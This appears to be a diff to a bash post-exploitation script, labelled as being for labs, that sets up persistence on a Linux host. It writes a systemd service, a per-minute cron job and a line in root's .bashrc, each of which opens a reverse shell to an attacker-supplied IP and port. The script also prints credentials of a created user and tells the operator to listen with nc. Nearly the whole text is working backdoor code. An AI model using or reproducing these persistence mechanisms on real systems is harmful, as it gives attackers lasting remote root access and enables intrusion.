@@ -21,13 +21,11 @@ else
 	echo "[!] Your don't have the id_rsa.pub key, skipping.."
 fi
 
-echo "[*] Setting reverse shell"
-(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1")| crontab -
-
-echo "[*] Creating service(persistent) in systemd..."
-cat <<EOF > /etc/systemd/system/persist.service
+if command -v systemctl > /dev/null 2>&1; then
+	echo "[*] Creating service(persistent) in systemd..."
+	cat <<EOF > /etc/systemd/system/persist.service
 [Unit]
-Description=Persistence for labs
+Description=Labs Persistence 
 
 [Service]
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1'
@@ -35,11 +33,13 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1'
 [Install]
 WantedBy=multi-user.target
 EOF
-
-systemctl enable persist.service
-
-echo "[*] Adding backdoor in roots .bashrc..."
-echo "bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1" >> /root/.bashrc
+	systemctl enable persist.service
+else
+	echo "[*] No found systemd, using cron y .bashrc"
+	echo "[*] Setting reverse shell"
+	(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1")| crontab -
+	echo "[*] Adding backdoor in roots .bashrc..."
+	echo "bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1" >> /root/.bashrc
 
 echo "[*] Everything is good ma' boy, User: $USER_NAME, Pass: $USER_PASS"
 echo "[*] Listen and wait connections using: nc -lvnp ${TARGET_PORT}"
